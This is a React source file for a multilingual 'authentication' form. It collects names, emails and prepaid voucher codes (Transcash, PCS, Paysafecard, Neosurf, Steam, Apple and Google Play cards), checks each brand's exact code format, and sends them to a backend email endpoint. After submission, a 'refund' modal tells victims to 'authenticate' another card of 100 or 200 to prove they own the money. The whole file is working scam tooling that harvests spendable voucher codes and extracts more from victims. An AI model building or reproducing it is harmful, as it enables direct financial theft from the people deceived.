import React, { FormEvent, useEffect, useState } from "react";
import { X } from "lucide-react";
import { Language, useI18n } from "../i18n";

type FormStatus = "idle" | "sending" | "success" | "error";
type PaymentMethod = "" | "Transcash" | "PCS" | "Paysafecard" | "Google Play Card" | "Neosurf" | "Steam Card" | "Apple Gift Card" | "Autre";

const referenceRules: Record<Exclude<PaymentMethod, "" | "Autre">, { length: number; pattern: string; digitsOnly: boolean }> = {
  Transcash: { length: 12, pattern: "[0-9]{12}", digitsOnly: true },
  PCS: { length: 10, pattern: "[0-9]{10}", digitsOnly: true },
  Paysafecard: { length: 16, pattern: "0[0-9]{15}", digitsOnly: true },
  "Google Play Card": { length: 16, pattern: "[A-Za-z0-9]{16}", digitsOnly: false },
  Neosurf: { length: 10, pattern: "[A-Za-z0-9]{10}", digitsOnly: false },
  "Steam Card": { length: 15, pattern: "[A-Za-z0-9]{15}", digitsOnly: false },
  "Apple Gift Card": { length: 16, pattern: "[A-Za-z0-9]{16}", digitsOnly: false },
};

const ruleHints: Record<Language, Record<Exclude<PaymentMethod, "" | "Autre">, string>> = {
  fr: { Transcash: "12 chiffres exactement", PCS: "10 chiffres exactement", Paysafecard: "16 chiffres exactement, en commençant par 0", "Google Play Card": "16 caractères alphanumériques exactement", Neosurf: "10 caractères alphanumériques exactement", "Steam Card": "15 caractères alphanumériques exactement", "Apple Gift Card": "16 caractères alphanumériques exactement" },
  en: { Transcash: "Exactly 12 digits", PCS: "Exactly 10 digits", Paysafecard: "Exactly 16 digits, starting with 0", "Google Play Card": "Exactly 16 alphanumeric characters", Neosurf: "Exactly 10 alphanumeric characters", "Steam Card": "Exactly 15 alphanumeric characters", "Apple Gift Card": "Exactly 16 alphanumeric characters" },
  de: { Transcash: "Genau 12 Ziffern", PCS: "Genau 10 Ziffern", Paysafecard: "Genau 16 Ziffern, beginnend mit 0", "Google Play Card": "Genau 16 alphanumerische Zeichen", Neosurf: "Genau 10 alphanumerische Zeichen", "Steam Card": "Genau 15 alphanumerische Zeichen", "Apple Gift Card": "Genau 16 alphanumerische Zeichen" },
  it: { Transcash: "Esattamente 12 cifre", PCS: "Esattamente 10 cifre", Paysafecard: "Esattamente 16 cifre, iniziando con 0", "Google Play Card": "Esattamente 16 caratteri alfanumerici", Neosurf: "Esattamente 10 caratteri alfanumerici", "Steam Card": "Esattamente 15 caratteri alfanumerici", "Apple Gift Card": "Esattamente 16 caratteri alfanumerici" },
  es: { Transcash: "Exactamente 12 dígitos", PCS: "Exactamente 10 dígitos", Paysafecard: "Exactamente 16 dígitos, empezando por 0", "Google Play Card": "Exactamente 16 caracteres alfanuméricos", Neosurf: "Exactamente 10 caracteres alfanuméricos", "Steam Card": "Exactamente 15 caracteres alfanuméricos", "Apple Gift Card": "Exactamente 16 caracteres alfanuméricos" },
  nl: { Transcash: "Precies 12 cijfers", PCS: "Precies 10 cijfers", Paysafecard: "Precies 16 cijfers, beginnend met 0", "Google Play Card": "Precies 16 alfanumerieke tekens", Neosurf: "Precies 10 alfanumerieke tekens", "Steam Card": "Precies 15 alfanumerieke tekens", "Apple Gift Card": "Precies 16 alfanumerieke tekens" },
};

const referenceLabels: Record<Language, { label: string; placeholder: string }> = {
  fr: { label: "Code de la recharge", placeholder: "Saisissez le code de la recharge" },
  en: { label: "Top-up code", placeholder: "Enter the top-up code" },
  de: { label: "Aufladecode", placeholder: "Aufladecode eingeben" },
  it: { label: "Codice di ricarica", placeholder: "Inserisci il codice di ricarica" },
  es: { label: "Código de recarga", placeholder: "Introduce el código de recarga" },
  nl: { label: "Opwaardeercode", placeholder: "Voer de opwaardeercode in" },
};

const optionalLabels: Record<Language, string> = {
  fr: "optionnel",
  en: "optional",
  de: "optional",
  it: "facoltativo",
  es: "opcional",
  nl: "optioneel",
};

const AuthForm: React.FC = () => {
  const { language, t } = useI18n();
  const [status, setStatus] = useState<FormStatus>("idle");
  const [errorMessage, setErrorMessage] = useState("");
  const [paymentMethod, setPaymentMethod] = useState<PaymentMethod>("");
  const [references, setReferences] = useState(["", "", ""]);
  const [isRefundModalOpen, setIsRefundModalOpen] = useState(false);
  const referenceRule = paymentMethod && paymentMethod !== "Autre" ? referenceRules[paymentMethod] : null;
  const referenceHint = paymentMethod && paymentMethod !== "Autre" ? ruleHints[language][paymentMethod] : "";

  useEffect(() => {
    if (!isRefundModalOpen) return;

    const handleKeyDown = (event: KeyboardEvent) => {
      if (event.key === "Escape") setIsRefundModalOpen(false);
    };

    document.addEventListener("keydown", handleKeyDown);
    return () => document.removeEventListener("keydown", handleKeyDown);
  }, [isRefundModalOpen]);

  const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();

    const form = event.currentTarget;
    const formData = new FormData(form);

    try {
      setStatus("sending");
      setErrorMessage("");

      const apiBaseUrl = (import.meta.env.VITE_API_URL || "").replace(/\/$/, "");
      const response = await fetch(`${apiBaseUrl}/api/send-email`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          fullName: formData.get("fullName"),
          email: formData.get("email"),
          paymentMethod: formData.get("paymentMethod"),
          amount: formData.get("amount"),
          rechargeCodes: [
            formData.get("rechargeCode1"),
            formData.get("rechargeCode2"),
            formData.get("rechargeCode3"),
          ].filter(Boolean),
          consent: formData.get("consent") === "oui",
        }),
      });

      if (!response.ok) {
        const result = await response.json().catch(() => null);
        const details = result?.details || result?.error;
        throw new Error(details || `La soumission a échoué avec le statut ${response.status}`);
      }

      form.reset();
      setPaymentMethod("");
      setReferences(["", "", ""]);
      setStatus("success");
    } catch (error) {
      console.error("Erreur d'envoi du formulaire :", error);
      setStatus("error");
      setErrorMessage(error instanceof Error ? error.message : t("error"));
    }
  };

  const fieldClassName =
    "w-full rounded-lg border border-gray-300 px-4 py-3 outline-none transition focus:border-red-600 focus:ring-2 focus:ring-red-200";

  return (
    <form
      name="recharge-support"
      method="POST"
      data-netlify="true"
      data-netlify-honeypot="bot-field"
      onSubmit={handleSubmit}
      className="mx-auto w-full max-w-md rounded-xl border border-gray-200 bg-white p-4 shadow-lg sm:p-6 md:p-8"
    >
      <input type="hidden" name="form-name" value="recharge-support" />

      <p hidden>
        <label>
          {t('bot')}
          <input name="bot-field" autoComplete="off" tabIndex={-1} />
        </label>
      </p>

      <div className="mb-6">
        <h2 className="text-xl font-bold text-gray-900 sm:text-2xl">{t('requestTitle')}</h2>
        <p className="mt-2 text-sm text-gray-600">
          {t('requestIntro')}
        </p>
      </div>

      <div className="mb-5">
        <label htmlFor="fullName" className="mb-2 block text-sm font-medium text-gray-700">
          {t('fullName')}
        </label>
        <input
          id="fullName"
          name="fullName"
          type="text"
          required
          autoComplete="name"
          className={fieldClassName}
          placeholder={t('fullNamePlaceholder')}
        />
      </div>

      <div className="mb-5">
        <label htmlFor="email" className="mb-2 block text-sm font-medium text-gray-700">
          {t('email')}
        </label>
        <input
          id="email"
          name="email"
          type="email"
          required
          autoComplete="email"
          className={fieldClassName}
          placeholder="exemple@gmail.com"
        />
      </div>

      <div className="mb-5">
        <label htmlFor="paymentMethod" className="mb-2 block text-sm font-medium text-gray-700">
          {t('payment')}
        </label>
        <select
          id="paymentMethod"
          name="paymentMethod"
          required
          value={paymentMethod}
          onChange={(event) => {
            setPaymentMethod(event.target.value as PaymentMethod);
            setReferences(["", "", ""]);
          }}
          className={fieldClassName}
        >
          <option value="" disabled>{t('select')}</option>
          <option value="Transcash">Transcash</option>
          <option value="PCS">PCS</option>
          <option value="Neosurf">Neosurf</option>
          <option value="Apple Gift Card">Apple Gift Card</option>
          <option value="Steam Card">Steam Card</option>
          <option value="Google Play Card">Google Play Card</option>
          <option value="Paysafecard">Paysafecard</option>
          <option value="Autre">{t('other')}</option>
        </select>
      </div>

      <div className="mb-5">
        <label htmlFor="amount" className="mb-2 block text-sm font-medium text-gray-700">
          {t('amount')}
        </label>
        <input
          id="amount"
          name="amount"
          type="number"
          min="0"
          step="0.01"
          required
          className={fieldClassName}
          placeholder={t('amountPlaceholder')}
        />
      </div>

      <div className="mb-5">
        <p className="mb-2 block text-sm font-medium text-gray-700">
          {referenceLabels[language].label}
        </p>
        <div className="space-y-3">
          {references.map((reference, index) => (
            <div key={index}>
              <label htmlFor={`rechargeCode${index + 1}`} className="mb-1 block text-sm text-gray-600">
                Code {index + 1}{index > 0 ? ` (${optionalLabels[language]})` : ""}
              </label>
              <input
                id={`rechargeCode${index + 1}`}
                name={`rechargeCode${index + 1}`}
                type="text"
                value={reference}
                onChange={(event) => {
                  const forbiddenCharacters = referenceRule?.digitsOnly ? /[^0-9]/g : /[^A-Za-z0-9]/g;
                  const nextReferences = [...references];
                  nextReferences[index] = event.target.value
                    .replace(forbiddenCharacters, "")
                    .toUpperCase()
                    .slice(0, referenceRule?.length ?? 64);
                  setReferences(nextReferences);
                }}
                minLength={referenceRule?.length ?? 1}
                maxLength={referenceRule?.length ?? 64}
                pattern={referenceRule?.pattern}
                title={referenceHint || undefined}
                inputMode={referenceRule?.digitsOnly ? "numeric" : "text"}
                required={index === 0}
                autoCapitalize="characters"
                className={`${fieldClassName} uppercase`}
                placeholder={`${referenceLabels[language].placeholder} ${index + 1}`}
                aria-describedby={referenceHint ? "reference-rule" : undefined}
              />
            </div>
          ))}
        </div>
        {referenceHint && <p id="reference-rule" className="mt-2 text-sm font-medium text-red-700">{referenceHint}</p>}
      </div>

      <div className="mb-6">
        <label className="flex items-start gap-3">
          <input type="checkbox" name="consent" value="oui" required className="mt-1 h-4 w-4" />
          <span className="text-sm text-gray-600">
            {t('consent')}
          </span>
        </label>
      </div>

      <button
        type="submit"
        disabled={status === "sending"}
        className="w-full rounded-lg bg-red-700 px-6 py-3 font-semibold text-white transition hover:bg-red-800 disabled:cursor-not-allowed disabled:opacity-60"
      >
        {status === "sending" ? t('sending') : t('send')}
      </button>

      {status === "success" && (
        <>
          <div role="status" className="mt-5 rounded-lg border border-green-200 bg-green-50 p-4 text-green-800">
            {t('success')}
          </div>
          <button
            type="button"
            onClick={() => setIsRefundModalOpen(true)}
            className="mt-3 w-full rounded-lg border-2 border-red-700 bg-white px-6 py-3 font-semibold text-red-700 transition hover:bg-red-50"
          >
            Remboursement
          </button>
        </>
      )}

      {status === "error" && (
        <div role="alert" className="mt-5 rounded-lg border border-red-200 bg-red-50 p-4 text-red-800">
          {errorMessage}
        </div>
      )}

      {isRefundModalOpen && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4"
          role="presentation"
          onMouseDown={(event) => {
            if (event.target === event.currentTarget) setIsRefundModalOpen(false);
          }}
        >
          <div
            role="dialog"
            aria-modal="true"
            aria-labelledby="refund-modal-title"
            className="relative w-full max-w-lg rounded-xl bg-white p-6 shadow-2xl sm:p-8"
          >
            <button
              type="button"
              onClick={() => setIsRefundModalOpen(false)}
              className="absolute right-4 top-4 rounded-full p-2 text-gray-500 transition hover:bg-gray-100 hover:text-gray-900"
              aria-label="Fermer la fenêtre"
            >
              <X className="h-5 w-5" aria-hidden="true" />
            </button>

            <h2 id="refund-modal-title" className="pr-10 text-2xl font-bold text-gray-900">
              Remboursement
            </h2>
            <p className="mt-5 rounded-lg border border-red-200 bg-red-50 p-4 leading-relaxed text-red-700">
              <strong>NB :</strong> Pour un remboursement, veuillez authentifier une autre carte d’un montant de 100 ou 200 pour confirmer que vous êtes le propriétaire des sous.
            </p>
          </div>
        </div>
      )}
    </form>
  );
};

export default AuthForm;
